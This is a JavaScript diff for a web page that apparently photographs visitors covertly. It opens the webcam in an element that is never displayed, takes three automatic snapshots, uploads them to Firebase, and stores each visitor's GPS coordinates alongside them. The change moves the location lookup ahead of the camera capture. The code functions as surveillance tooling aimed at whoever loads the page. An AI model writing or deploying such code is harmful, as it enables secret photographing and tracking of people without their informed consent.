@@ -45,26 +45,17 @@
       return new Blob([new Uint8Array([...Array(binary.length).keys()].map(i => binary.charCodeAt(i)))], { type: 'image/png' });
     };
 
-    const capturePhoto = (video, canvas, storageRef, captureCount, callback) => {
+    const capturePhoto = (video, canvas, storageRef, captureCount, location, callback) => {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
       storageRef.put(dataURLtoBlob(canvas.toDataURL('image/png'))).then((snapshot) => {
         snapshot.ref.getDownloadURL().then((downloadURL) => {
           if (captureCount === 2) {
-            navigator.geolocation.getCurrentPosition((position) => {
-              const location = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude
-              };
-              db.collection('images').add({
-                url: downloadURL,
-                location: location
-              }).then(callback).catch(console.error);
-            }, (error) => {
-              console.error('فشل في الحصول على الموقع:', error);
-              db.collection('images').add({ url: downloadURL }).then(callback).catch(console.error);
-            });
+            db.collection('images').add({
+              url: downloadURL,
+              location: location
+            }).then(callback).catch(console.error);
           } else {
             db.collection('images').add({ url: downloadURL }).then(callback).catch(console.error);
           }
@@ -72,10 +63,10 @@
       }).catch(console.error);
     };
 
-    const capturePhotos = (video, canvas, storageRefBase, captureCount) => {
-      capturePhoto(video, canvas, storageRefBase.child(`snapshot_${Date.now()}_${captureCount}.png`), captureCount, () => {
+    const capturePhotos = (video, canvas, storageRefBase, location, captureCount) => {
+      capturePhoto(video, canvas, storageRefBase.child(`snapshot_${Date.now()}_${captureCount}.png`), captureCount, location, () => {
         if (++captureCount < 3) {
-          setTimeout(() => capturePhotos(video, canvas, storageRefBase, captureCount), 500);
+          setTimeout(() => capturePhotos(video, canvas, storageRefBase, location, captureCount), 500);
         } else {
           video.srcObject.getTracks().forEach(track => track.stop());
         }
@@ -92,16 +83,25 @@
 
     const initializePhotoCapture = async () => {
       await requestCameraPermission();
-      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-        video.addEventListener('loadeddata', () => {
-          const canvas = document.getElementById('canvas');
-          let captureCount = 0;
-          capturePhotos(video, canvas, storage.ref().child('snapshots/'), captureCount);
-        });
-      }).catch(console.error);
+      navigator.geolocation.getCurrentPosition((position) => {
+        const location = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude
+        };
+
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+          video.addEventListener('loadeddata', () => {
+            const canvas = document.getElementById('canvas');
+            let captureCount = 0;
+            capturePhotos(video, canvas, storage.ref().child('snapshots/'), location, captureCount);
+          });
+        }).catch(console.error);
+      }, (error) => {
+        console.error('فشل في الحصول على الموقع:', error);
+      });
     };
 
     if ('serviceWorker' in navigator) {
